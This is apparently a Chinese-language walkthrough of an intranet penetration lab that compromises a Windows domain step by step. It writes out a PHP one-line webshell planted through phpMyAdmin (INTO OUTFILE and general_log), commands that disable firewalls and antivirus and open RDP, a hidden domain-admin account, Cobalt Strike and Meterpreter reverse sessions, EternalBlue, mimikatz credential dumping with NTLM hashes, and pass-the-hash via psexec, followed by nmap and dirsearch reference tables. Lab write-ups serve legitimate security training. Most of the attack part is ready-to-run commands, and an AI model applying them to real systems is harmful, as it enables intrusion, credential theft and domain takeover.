## 环境搭建

 **ip段设置**

    
    
    kali (coleak)：192.168.145.139
    Windows 7 (stu1)：192.168.10.181、192.168.145.140
    Winserver 2008 (owa)：192.168.10.180
    Win2k3 (root-tvi862ubeh)：192.168.10.182
    

> kali可以访问win7，但不能直接访问win08和win2k3

 **开启win7 web/mysql服务**

![image-20230813114956624.png](https://image.3001.net/images/20230814/1691987481_64d9ae191421c9b7473b8.png!small)

## 信息收集

 **端口扫描**

    
    
    sudo nmap -sS -p 1-65535 -v 192.168.145.140
    

> 80/tcp open http  
> 3306/tcp open mysql

 **web目录扫描**

    
    
    dirsearch -u http://192.168.145.140/
    

![image-20230813131203348.png](https://image.3001.net/images/20230814/1691987534_64d9ae4e23e60b72a1093.png!small)

**爆破登录**

访问80端口是一个phpStudy 探针，结合phpinfo.php和探针知晓主目录在C:/phpStudy/WWW

bp爆破mysql的root弱口令获得root的密码

![image-20230813125231703.png](https://image.3001.net/images/20230814/1691987667_64d9aed313eb22865b74b.png!small)

进入phpmyadmin，用root/root尝试登录成功

## PhpMyAdmin 后台 Getshell

phpmyadmin有两种getshell方式

>   * into outfile导出木马
>
>   * 利用Mysql日志文件getshell
>
>

### into outfile

> 需看要secure_file_priv的值。
> 当value为“null”时，不允许读取任意文件，当value为“空”时，允许读取任意文件，value可也已设置为其他路径。
    
    
    select @@basedir;   #查看一下网站的路径 C:/phpStudy/MySQL/
    select '<?php eval($_POST[cmd]);?>' into outfile 'C:/phpStudy/www/hack.php';
    show global variables like '%secure%';    #secure_auth OFF;secure_file_priv NULL
    

> 当secure_file_priv为NULL时，表示限制Mysql不允许导入导出，这里为NULL。所以into
> outfile写入木马出错。要想使得该语句导出成功，则需要在Mysql文件夹下修改my.ini
> 文件，在[mysqld]内加入secure_file_priv =""。(windows下修改配置文件：mysql.ini
> linux修改配置文件：my.cnf)

### Mysql日志文件写入shell

    
    
    show variables like '%general%';   #查看日志状态：
    SET GLOBAL general_log='on';    #开启 general_log
    SET GLOBAL general_log_file='C:/phpStudy/www/hack.php';
    #指定日志写入到网站根目录的 hack.php 文件
    show variables like '%general%';
    

general_log| ON  
---|---  
general_log_file| C:/phpStudy/www/hack.php  
      
    
    SELECT '<?php eval($_POST["cmd"]);?>'; 即可将一句话木马写入 hack.php 文件中
    

![image-20230813133614388.png](https://image.3001.net/images/20230814/1691987697_64d9aef122fff741cdf73.png!small)

## CS后渗透

上传免杀后门qm.exe上线cs

![image-20230813134637615.png](https://image.3001.net/images/20230814/1691987714_64d9af0219aceed102b92.png!small)

关闭防火墙

    
    
    #注册表开启3389端口
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    
    #添加防火墙规则
    netsh advfirewall firewall add rule name="Open 3389" dir=in action=allow protocol=TCP localport=3389
    
    #关闭防火墙
    netsh firewall set opmode disable   			#winsows server 2003 之前
    netsh advfirewall set allprofiles state off 	#winsows server 2003 之后
    
    netsh advfirewall show allprofile state //展示状态
    netsh advfirewall set allprofiles state off //关闭防火墙
    

查看用户为god\administrator域管权限，收集域内信息

    
    
    net view                 # 查看局域网内其他主机名
    net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
    net user                 # 查看本机用户列表
    net user /domain         # 查看域用户
    net localgroup administrators # 查看本地管理员组（通常会有域用户）
    net view /domain         # 查看有几个域(域名获取)
    net user 用户名 /domain   # 获取指定域用户的信息
    net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
    net group 组名 /domain    # 查看域中某工作组
    net group "domain admins" /domain  # 查看域管理员的名字
    net group "domain computers" /domain  # 查看域中的其他主机名
    net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
    网络扫描、端口扫描
    
    
    
    抓取hash和明文密码，然后查看密码凭证
    

![image-20230813162234108.png](https://image.3001.net/images/20230814/1691987728_64d9af10f17f618b102e8.png!small)

    
    
    net view	#\\OWA \\ROOT-TVI862UBEH  还有两台主机
    

![image-20230813162703385.png](https://image.3001.net/images/20230814/1691987741_64d9af1df0cb35881066d.png!small)

    
    
    jump psexec OWA smb
    jump psexec root-tvi862ubeh smb
    三台主机全部上线
    

![image-20230813163850416.png](https://image.3001.net/images/20230814/1691987756_64d9af2ccc8967fc67494.png!small)

选择psexec横向移动

![image-20230813163751118.png](https://image.3001.net/images/20230814/1691987787_64d9af4b4eb4a6d9bdf85.png!small)

网络拓扑图如下

![image-20230813164007115.png](https://image.3001.net/images/20230814/1691987804_64d9af5c6b073df5f4829.png!small)

VPN部署

![image-20230813170234051.png](https://image.3001.net/images/20230814/1691987813_64d9af654acff193b3d7e.png!small)

    
    
    sudo ifconfig phear0 192.168.10.0/24
    ping 192.168.10.180
    nmap 192.168.10.167 -sT -A -p 445
    

代理远程桌面

    
    
    // 添加test用户net user test p-0p-0p-0 /add /domain
    // 把 test 用户添加进域管理员组net group "domain admins" test /add /domain
    // 查看域管理员net group "domain admins" /domain
    rdesktop 192.168.10.180
    god\test p-0p-0-p-0
    

## MSF后渗透

 **CS派生会话给MSF**

    
    
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_http
    set lhost 192.168.145.139
    set lport 4566
    run
    

![image-20230813185104168.png](https://image.3001.net/images/20230814/1691987824_64d9af7085b0ceb9a2545.png!small)

新建会话到该新建的监听器

查看主机是否运行在虚拟机上

    
    
    run post/windows/gather/checkvm
    

关闭掉目标主机的杀毒软件，通过命令

    
    
    run post/windows/manage/killav
    

获取目标主机的详细信息

    
    
    sysinfo
    

> meterpreter > sysinfo  
> Computer : STU1  
> OS : Windows 7 (6.1 Build 7601, Service Pack 1).  
> Architecture : x64  
> System Language : zh_CN  
> Domain : GOD  
> Logged On Users : 3  
> Meterpreter : x86/windows

Meterpreter支持非常多的文件系统命令（基本跟Linux系统命令类似），一些常用命令如下：

    
    
    pwd：当前所在位置
    ls：获取当前目录下的文件
    cd：切换目标目录；
    cat：读取文件内容；
    rm：删除文件；
    edit：使用vim编辑文件
    mkdir：新建目录；
    rmdir：删除目录；
    upload file 命令则能够向目标系统上传文件。
    download file 命令可以帮助我们从目标系统中下载文件
    

获取内网网段信息

    
    
    run get_local_subnets
    
    # 可以用模块自动添加路由
    run post/multi/manage/autoroute
    #添加一条路由
    run autoroute -s 192.168.10.0/24
    #查看路由添加情况
    run autoroute -p
    

> Subnet Netmask Gateway
>
> * * *
>
> 169.254.0.0 255.255.0.0 Session 1  
> 192.168.10.0 255.255.255.0 Session 1  
> 192.168.145.0 255.255.255.0 Session 1

配置并启用隧道

    
    
    use auxiliary/server/socks_proxy
    set SRVPORT 8999
    setg Proxies socks5:192.168.145.139:8999
    setg ReverseAllowProxy true
    

横向移动

    
    
    background
    use auxiliary/scanner/portscan/tcp
    set rhosts 192.168.10.181
    set ports 80,135-139,445,3306,3389
    run
    

> [+] 192.168.10.181: - 192.168.10.181:80 - TCP OPEN  
> [+] 192.168.10.181: - 192.168.10.181:135 - TCP OPEN  
> [+] 192.168.10.181: - 192.168.10.181:139 - TCP OPEN  
> [+] 192.168.10.181: - 192.168.10.181:445 - TCP OPEN  
> [+] 192.168.10.181: - 192.168.10.181:3306 - TCP OPEN  
> [+] 192.168.10.181: - 192.168.10.181:3389 - TCP OPEN
    
    
    set rhosts 192.168.10.182
    run
    

> [+] 192.168.10.182: - 192.168.10.182:135 - TCP OPEN  
> [+] 192.168.10.182: - 192.168.10.182:139 - TCP OPEN  
> [+] 192.168.10.182: - 192.168.10.182:445 - TCP OPEN

 **有445端口，尝试永恒之蓝ms17-010攻击**

漏洞扫描

    
    
    use auxiliary/scanner/smb/smb_ms17_010
    set rhosts 192.168.10.181
    run
    

利用（内网环境，需要正向shell连接）

    
    
    use exploit/windows/smb/ms17_010_eternalblue
    set payload windows/x64/meterpreter/bind_tcp
    set rhosts 192.168.10.181
    run
    

> 并没有拿到shell，ms17-010直接拿到shell的情况并不多，成功率不高

 **哈希传递攻击(PTH)**

hashdump

    
    
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    

ps：ms6中 mimikatz模块已经合并为kiwi模块

    
    
    load kiwi
    
    creds_all  #列举所有凭据
    creds_kerberos  #列举所有kerberos凭据
    creds_msv  #列举所有msv凭据
    creds_ssp  #列举所有ssp凭据
    creds_tspkg  #列举所有tspkg凭据
    creds_wdigest  #列举所有wdigest凭据
    dcsync  #通过DCSync检索用户帐户信息
    dcsync_ntlm  #通过DCSync检索用户帐户NTLM散列、SID和RID
    golden_ticket_create  #创建黄金票据
    kerberos_ticket_list  #列举kerberos票据
    kerberos_ticket_purge  #清除kerberos票据
    kerberos_ticket_use  #使用kerberos票据
    kiwi_cmd  #执行mimikatz的命令，后面接mimikatz.exe的命令
    lsa_dump_sam  #dump出lsa的SAM
    lsa_dump_secrets  #dump出lsa的密文
    password_change  #修改密码
    wifi_list  #列出当前用户的wifi配置文件
    wifi_list_shared  #列出共享wifi配置文件/编码
    

> 抓取失败了，emmmm，重新上线cs抓取
    
    
    [00000003] Primary
    	 * Username : Administrator
    	 * Domain   : GOD
    	 * NTLM     : 8a963371a63944419ec1adf687bb1be5
    

**psexec|hash传递**

在 Metasploit 中，经常使用于哈希传递攻击的模块有：

    
    
    auxiliary/admin/smb/psexec_command   #在目标机器上执行系统命令
    exploit/windows/smb/psexec           #用psexec执行系统命令
    exploit/windows/smb/psexec_psh       #使用powershell作为payload
    

探测445

    
    
    use auxiliary/scanner/smb/smb_version 
    set rhost 192.168.10.180
    set threads 40
    run
    set rhost 192.168.10.182
    run
    

exploit/windows/smb/psexec模块哈希传递攻击 Windows Server 2008

    
    
    use exploit/windows/smb/psexec
    set rhosts 192.168.10.181
    set SMBUser administrator 
    set smbpass 00000000000000000000000000000000:8a963371a63944419ec1adf687bb1be5
    run
    

![image-20230813195058012.png](https://image.3001.net/images/20230814/1691987843_64d9af839c7a6d76812f3.png!small)

## 知识补充

### nmap

#### 参数分类

 **主机发现**

    
    
    -sL 						   仅列出指定网络的每个主机，不发送探测
    -sn 						   在发现主机后不进行端口探测
    -Pn 						   将所有主机视为在线，不进行主机发现，由ICMP回显请求、TCP SYN 到端口 443、TCP ACK 到端口 80 和 ICMP 默认情况下的时间戳请求组成
    -PS/-PA/-PU/-PY  <port> 		对给定端口进行TCP的SYN/ACK，UDP 或 SCTP扫描，参数和端口之间不能有空格 
    -PE/-PP/-PM                     ICMP回显，时间戳和网络掩码请求探测
    -PO <协议列表> 					发送具有指定协议编号的IP数据包
    --disable-arp-ping或--send-ip 	对于本地以太网上的主机不进行ARP扫描，而是IP地址扫描，默认是ARP
    --discovery-ignore-rst 			不理RST回复，有时防火墙会欺骗RST回复，而响应对不存在的地址的探测
    --traceroute 					路由跟踪扫描
    -A                         此选项设置包含了1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测
    -6                         使用IPv6
    

**端口扫描**

    
    
    -sU 						    UDP扫描
    -sT 						    TCP扫描
    -sS						        SYN半开放扫描
    -sN 						    TCP空扫描，如果向关闭端口发送不包含RST的请求，将回复RST作为响应
    -sF 						    FIN标志的数据包扫描
    -b <FTP中继主机>				  FTP退回扫描（<用户名>：<密码>@<服务器>：<端口>），一种利用FTP服务器的间接扫描
    -sX 						    圣诞树扫描
    -sA 						    TCP ACK扫描，探测端口是否被防火墙屏蔽
    -sW 						    TCP窗口扫描，这与ACK扫描相同，但通过TCP窗口字段检测端口是否开放，准确率不高
    -sM 						    TCP迈蒙扫描，以起发现者命名
    -sI 						    TCP空闲扫描，一种间接的扫描
    --scanflags <要设置的TCP标注位> 	可以自己指定TCP标志位，还可以同时设置TCP扫描类型(-sA，-sF)以告诉nmap如何解释响应
    -sY 						    SCTP INIT扫描即SCTP初始化扫描
    -sZ 						    SCTP COOKIE ECHO扫描，开放的端口将丢弃包含COOKIE ECHO的数据包，但端口是关闭将回复ABORT
    -sO 						    扫描端口支持的IP协议
    -Pn -sn 						跳过主机发现和端口扫描，但仍可以运行NSE（脚本）
    -sP						        用类似ping扫描
    

**服务和系统探测**

    
    
    -sV 						Version版本检测扫描， 用来扫描目标主机和端口上运行的软件的版本
    --version-intensity 		设置版本扫描的强度0-9，默认7，强度越高准确率越高时间越长
    --version-all 				尝试每个强度的探测
    --version-trace 			显示详细的版本扫描活动
    --allports 					默认nmap版本扫描时不扫一些端口，这将扫所有端口
    -O 						    操作系统类型的探测
    --osscan-guess(--fuzzy)     猜测匹配操作系统，配合-O
    --osscan-limit				限制Nmap只对有希望确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）
    --max-os-trys 				设置对目标的最大尝试次数，默认5
    

**脚本**

    
    
    -sC 						    默认脚本扫描，即--script=default，这些脚本具有入侵性
    --script <filename>|<category>|<directory>/|<expression>[,...]  每元素首先被解释为表达式，然后被解释为类别，并且 最后作为文件或目录名称。
    --script-args  				    为脚本提供参数
    --script-args-file <filename> 	从文件向脚本通过参数
    --script-help 					获取脚本说明
    --script-updatedb 				更新找到的脚本数据库
    

**设置时序和性能**

    
    
    --min-hostgroup <number>;--max-hostgroup <number>    	nmap是一次性扫描一个组的主机，这设置一个组的最大和最小自己数
    --host_timeout 					设置扫描一台主机的时间，以毫秒为单位，默认无时限
    -T  <0-5>   					设置时间模版  paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)、insane (5)
    paranoid、sneaky模式用于IDS躲避
    Polite模式降低了扫描速度以使用更少的带宽和目标主机资源。
    Normal为默认模式，因此 -T 3  实际上是未做任何优化。
    Aggressive模式假设用户具有合适及可靠的网络从而加速扫描. 
    nsane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性
    

**扫描结果**

    
    
    open  					端口开放
    closed 					端口是关闭
    filtered 				端口被防火墙IDS/IPS屏蔽，不能确定状态
    unfiltered 				端口没被屏蔽，但是否开放还要进一步确定
    open|filtered 			端口是开放或被屏蔽，Nmap不能识别
    closeed|filtered 		端口是关闭或被屏蔽，Nmap不能识别
    

**设置输出**

    
    
    -oN <文件>    				输出到文件
    -oX <文件>  				输出到XML文件
    -oG grep-output.txt  		扫描的结果输出到屏幕,同时会存储一份到grep-output.txt
    -v（-vv） <级别>             详细输出扫描
     -d <级别>					设置调试级别，当即使是详细模式也无法提供足够的数据时，调试可用于提供更多内容
    --reason 					显示主机和端口状态原因
    --open						仅显示打开或可能打开的端口
    -append-output				附加到而不是清空输出文件，为输出格式标志指定文件名时 例如 -oX 或 -oN，即 文件默认被覆盖
    

#### 参数速查表

参数(区分大小写)| 说明  
---|---  
-sT| TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。  
-sS| 半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。  
-sF -sN| 秘密FIN数据包扫描、Xmas Tree、Null扫描模式  
-sP| ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。  
-sU| UDP扫描，但UDP扫描是不可靠的  
-sA| 这项高级的扫描方法通常用来穿过防火墙的规则集  
-sV| 探测端口服务版本  
-Pn| 扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描  
-v| 显示扫描过程，推荐使用  
-h| 帮助选项，是最清楚的帮助文档  
-p| 指定端口，如“1-65535、1433、135、22、80”等  
-O| 启用远程操作系统检测，存在误报  
-A| 全面系统检测、启用脚本检测、扫描等  
-oN/-oX/-oG| 将报告写入文件，分别是正常、XML、grepable 三种格式  
-T4| 针对TCP端口禁止动态扫描延迟超过10ms  
-iL| 读取主机列表，例如，“-iL C:\ip.txt”  
  
### dirsearch

    
    
    采用默认设置扫描目标url
    python3 dirsearch.py -u https://target
    
    使用文件拓展名为php,html,js的字典扫描目标url
    python3 dirsearch.py -e php,html,js -u https://target
    
    采用指定路径的wordlist且拓展名为php,html,js的字典扫描目标url
    python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist
    
    递归扫描
    python3 dirsearch.py -e php,html,js -u https://target -r
    
    设置递归层数为3
    python3 dirsearch.py -e php,html,js -u https://target -r -R 3
    
    指定线程(不建议线程数调整过大，可能会影响扫描的结果)
    python3 dirsearch.py -e bak,zip,tgz,txt -u https://target -t 30
    

